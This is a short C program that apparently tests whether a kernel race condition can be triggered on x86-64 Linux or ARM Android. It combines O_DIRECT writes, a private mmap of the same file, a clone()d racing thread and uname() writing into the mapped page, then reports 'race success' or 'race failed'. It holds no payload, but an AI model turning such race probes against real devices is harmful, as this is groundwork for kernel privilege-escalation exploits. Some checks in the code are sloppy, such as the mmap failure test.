//#include <fcntl.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <linux/sched.h>
#include <sys/syscall.h>
#include <errno.h>
#include <asm/fcntl.h>
#include <dlfcn.h>

#if __x86_64
#define FILE_NAME "/tmp/.ttt"
#elif __arm__
#define FILE_NAME "/data/local/tmp/.ttt"
#endif

volatile int check, s_check, racer = 0;

#define STACK_SIZE 8192
char stack[STACK_SIZE];

int race_thread(void *arg)
{
    while (!racer);
    check = 1;
}

int start_thread(int (*f)(void *), void *arg)
{
    char *stack = calloc(1, STACK_SIZE);
    int tid;

    if (stack == NULL) {
        perror("child stack");
        return -1;
    }
    #if __x86_64
    tid = clone(f, stack + STACK_SIZE - sizeof(unsigned long),
                CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_VM, arg);
    #elif __arm__ 
    void *handle;
    int (*my_clone)(int (*f) (void*), void *stack, int flags, void *arg, ...);
    
    handle = dlopen("/system/lib/libc.so", RTLD_NOW);
    if (handle == NULL){
        perror("dlopen");
        return -1;
    }
    my_clone = dlsym(handle, "clone");
    if (my_clone == NULL){
        perror("dlsym clone");
        return -1;
    }
    tid = my_clone(f, stack + STACK_SIZE - sizeof(unsigned long),
                CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_VM, arg);
    #endif
    if (tid < 0){
        free(stack);
        perror("clone");
        //fprintf(stderr, "clone failed!\n");
    }
    return tid;
}


int main()
{
    int fd_direct, fd_common;
    void *addr;
    pthread_t tid;
    char *buf;

    fd_direct = open(FILE_NAME, O_RDWR | O_DIRECT | O_CREAT, S_IRWXU);
    if (fd_direct < 0) {
        perror("open direct");
        goto out;
    }

    fd_common = open(FILE_NAME, O_RDWR | O_CREAT, S_IRWXU);
    if (fd_common < 0) {
        perror("open normal");
        goto out;
    }

    buf = memalign(512, 1024);
    memset(buf, 'A', 1024);
    if (write(fd_direct, (void*)buf, 1024) < 0) {
        perror("write");
        goto out;
    }

    addr = mmap(0, 1024, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd_common, 0);
    if (addr == NULL) {
        perror("mmap");
        goto out;
    }

    start_thread(race_thread, NULL);

    racer = check = 0;
    s_check = check;

    racer = 1;
    uname((struct utsname *)addr);

    if (s_check != check)
        printf("race success!\n");
    else
        printf("race failed!\n");
    close(fd_common);
    close(fd_direct);

out:

    return 0;
}
